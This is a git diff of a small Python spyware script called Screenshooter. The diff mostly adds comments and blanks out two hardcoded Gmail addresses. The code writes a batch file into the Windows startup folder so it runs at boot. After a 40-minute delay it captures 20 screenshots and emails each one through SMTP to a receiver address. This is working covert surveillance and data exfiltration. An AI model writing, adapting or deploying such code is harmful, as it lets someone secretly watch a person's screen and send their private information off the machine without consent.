@@ -1,20 +1,21 @@
-# I don’t know how this shit works but it works
-# uwu
+# I don’t know how this shit works but it still works
+# import this for send logs by email
 import smtplib
 from email.mime.multipart import MIMEMultipart
-# file with my pass u don't need for this
-import ur_passord
-from email.mime.base import MIMEBase
 from email import encoders
+from email.mime.base import MIMEBase
+# file with my pass, u don't need for this
+import ur_passord
+# for doing screenshots
 import pyautogui
 import time
 import getpass
 import os
 
-# this code move program to start-up
+# able to use main windows folder
 USER_NAME = getpass.getuser()
 
-
+# attempt to add programm to start-up 
 def add_to_startup(file_path="Screenshooter.exe"):
     if file_path == "Screenshooter.exe":
         file_path = os.path.dirname(os.path.realpath(__file__))
@@ -23,28 +24,33 @@ def add_to_startup(file_path="Screenshooter.exe"):
         bat_file.write(r'start "" %s' % file_path)
 
 
-# while timer
-sender_email = "PlanshetGreg@gmail.com"
-receiver_email = "OneGreg0ry4k@gmail.com"
+# paste here ur's email
+sender_email = ""
+receiver_email = ""
+
 add_to_startup()
 
+# 20 screenshots is taken every m-sec
 time.sleep(2400)
+
+
+# doing, doing 20 screenshots
 for i in range(20):
+    # screenshot
     screenshot = pyautogui.screenshot()
     screenshot.save("screenshot1.png")
-    # copied from documentation uwu
 
+    # creating message
     message = MIMEMultipart()
     message["From"] = sender_email
     message['To'] = receiver_email
     message['Subject'] = "Report" + str(i)
 
-    # Get file
+    # Attach file to email
     file = "screenshot1.png"
     attachment = open(file, 'rb')
 
     # Send mail
-    # I don’t know what this shit does but it works
     obj = MIMEBase('application', 'octet-stream')
     obj.set_payload(attachment.read())
     encoders.encode_base64(obj)
@@ -59,4 +65,5 @@ for i in range(20):
     email_session.sendmail(sender_email, receiver_email, my_message)
     email_session.quit()
 
+    # finished
     print("Email send success")
